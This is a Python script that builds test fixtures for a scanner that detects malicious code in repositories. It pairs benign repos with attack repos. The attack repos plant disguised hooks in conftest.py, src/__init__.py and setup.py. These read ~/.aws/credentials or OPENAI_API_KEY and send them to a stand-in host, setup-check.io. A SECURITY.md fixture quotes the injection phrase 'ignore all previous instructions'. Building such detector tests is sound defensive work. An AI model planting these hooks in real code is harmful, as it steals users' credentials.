"""Build the extra evaluation repos: each is the clean invoice library plus one small change.

Attack repos are inert test doubles for a defensive scanner. They read a FAKE file or environment
variable (planted by Agent Trap, never a real credential) and send it to a FAKE host that has no
route out of the sandbox. They differ only in when the code runs, following the stages at which
malicious Python packages run: install time, import time and test time.

Benign repos do things that look a little suspicious but are legitimate, to measure false alarms.

    python scripts/build_eval_fixtures.py
"""

from __future__ import annotations

import shutil
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "fixtures"
BASE = FIXTURES / "benign" / "invoice_clean"

# One function body, used at three different moments.
_SEND_FAKE_FILE = """    try:
        data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()
        urllib.request.urlopen("https://setup-check.io/verify", data=data, timeout=5)
    except Exception:
        pass
"""

ATTACKS: dict[str, dict[str, str]] = {
    # runs when the tests are collected
    "test_time_exfil": {
        "tests/conftest.py": (
            '"""Shared test setup."""\n\nimport os\nimport urllib.request\n\n\n'
            'def _report_environment():\n    """Report test environment details."""\n'
            + _SEND_FAKE_FILE
            + "\n\n_report_environment()\n"
        )
    },
    # runs when the package is imported, which the tests do
    "import_time_exfil": {
        "src/__init__.py": (
            '"""Invoice helpers."""\n\nimport os\nimport urllib.request\n\n\n'
            'def _announce():\n    """Send an anonymous usage ping."""\n'
            + _SEND_FAKE_FILE
            + "\n\n_announce()\n"
        )
    },
    # runs at install time and reads an environment variable instead of a file
    "env_secret_exfil": {
        "setup.py": (
            "import os\nimport urllib.request\n\nfrom setuptools import setup\n\n\n"
            'def _report_build_environment():\n    """Report build environment details."""\n'
            "    try:\n"
            '        token = os.environ["OPENAI_API_KEY"]\n'
            '        urllib.request.urlopen("https://setup-check.io/verify", '
            "data=token.encode(), timeout=5)\n"
            "    except Exception:\n        pass\n\n\n"
            "_report_build_environment()\n"
            'setup(name="fast-invoice", version="1.0.3", packages=["src"])\n'
        )
    },
}

BENIGN: dict[str, dict[str, str]] = {
    "multi_module": {
        "src/tax.py": "def with_tax(amount, rate):\n    return round(amount * (1 + rate), 2)\n",
        "src/formatting.py": 'def money(value):\n    return f"${value:,.2f}"\n',
        "tests/test_tax.py": (
            "from src.formatting import money\nfrom src.tax import with_tax\n\n\n"
            "def test_with_tax():\n    assert with_tax(100, 0.2) == 120.0\n\n\n"
            'def test_money():\n    assert money(1234.5) == "$1,234.50"\n'
        ),
    },
    # reads ordinary environment variables, none of them secrets
    "reads_env": {
        "src/settings.py": (
            '"""Settings read from the environment, with defaults."""\n\nimport os\n\n'
            'CURRENCY = os.environ.get("INVOICE_CURRENCY", "USD")\n'
            'LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO")\n\n\n'
            'def describe():\n    return f"{CURRENCY} / {LOG_LEVEL}"\n'
        ),
        "tests/test_settings.py": (
            "from src.settings import describe\n\n\n"
            'def test_defaults():\n    assert describe() == "USD / INFO"\n'
        ),
    },
    # reads the credentials file, as AWS tooling legitimately does, and sends nothing anywhere
    "reads_home_config": {
        "src/aws_profiles.py": (
            '"""List profile names from ~/.aws/credentials. The file is only read."""\n\n'
            "import configparser\nimport os\n\n\n"
            'def list_profiles(path="~/.aws/credentials"):\n'
            "    parser = configparser.ConfigParser()\n"
            "    parser.read(os.path.expanduser(path))\n    return parser.sections()\n"
        ),
        "tests/test_profiles.py": (
            "from src.aws_profiles import list_profiles\n\n\n"
            "def test_profiles_are_a_list():\n    assert isinstance(list_profiles(), list)\n"
        ),
    },
    # contacts a package index, which is on the allow-list
    "contacts_package_index": {
        "tests/test_index.py": (
            "import urllib.request\n\n\n"
            "def test_package_index_is_reachable_or_skipped():\n    try:\n"
            '        urllib.request.urlopen("https://pypi.org/simple/pip/", timeout=5).read()\n'
            "    except OSError:\n        pass  # offline machines are fine\n"
        )
    },
    # talks to a server on the same machine
    "uses_localhost": {
        "tests/test_local_server.py": (
            "import http.server\nimport threading\nimport urllib.request\n\n\n"
            "def test_local_server_roundtrip():\n"
            "    class Handler(http.server.BaseHTTPRequestHandler):\n"
            "        def do_GET(self):\n            self.send_response(200)\n"
            "            self.end_headers()\n            self.wfile.write(b'ok')\n\n"
            "        def log_message(self, *args):\n            pass\n\n"
            '    server = http.server.HTTPServer(("127.0.0.1", 0), Handler)\n'
            "    threading.Thread(target=server.serve_forever, daemon=True).start()\n"
            "    try:\n        port = server.server_address[1]\n"
            '        url = f"http://127.0.0.1:{port}/"\n'
            "        assert urllib.request.urlopen(url, timeout=5).read() == b'ok'\n"
            "    finally:\n        server.shutdown()\n"
        )
    },
    # security documentation that quotes the kind of phrase injections use
    "security_docs": {
        "SECURITY.md": (
            "# Security\n\nThis library parses invoices from untrusted text.\n\n"
            "If you let an AI assistant read invoices, treat their text as data. A line such as\n"
            '"ignore all previous instructions" inside an invoice is just text to be parsed,\n'
            "never a command. Report vulnerabilities by email to the maintainers.\n"
        )
    },
    # a legitimate network call to the library's own service, with an offline fallback
    "fetches_exchange_rates": {
        "src/rates.py": (
            '"""Exchange rates, with a built-in fallback so it works offline."""\n\n'
            "import json\nimport urllib.request\n\n"
            'FALLBACK = {"USD": 1.0, "EUR": 0.92}\n\n\n'
            "def load_rates():\n    try:\n"
            '        with urllib.request.urlopen("https://rates.example-lib.org/latest.json", '
            "timeout=5) as response:\n            return json.load(response)\n"
            "    except Exception:\n        return FALLBACK\n"
        ),
        "tests/test_rates.py": (
            "from src.rates import load_rates\n\n\n"
            'def test_rates_have_usd():\n    assert load_rates()["USD"] == 1.0\n'
        ),
    },
}


def build(kind: str, fixtures: dict[str, dict[str, str]]) -> None:
    for name, overlay in fixtures.items():
        repo = FIXTURES / kind / name
        if repo.exists():
            shutil.rmtree(repo)
        shutil.copytree(BASE, repo)
        for relative, text in overlay.items():
            path = repo / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text)


def main() -> None:
    build("attacks", ATTACKS)
    build("benign", BENIGN)
    print(f"built {len(ATTACKS)} attack and {len(BENIGN)} benign fixtures in {FIXTURES}/")


if __name__ == "__main__":
    main()
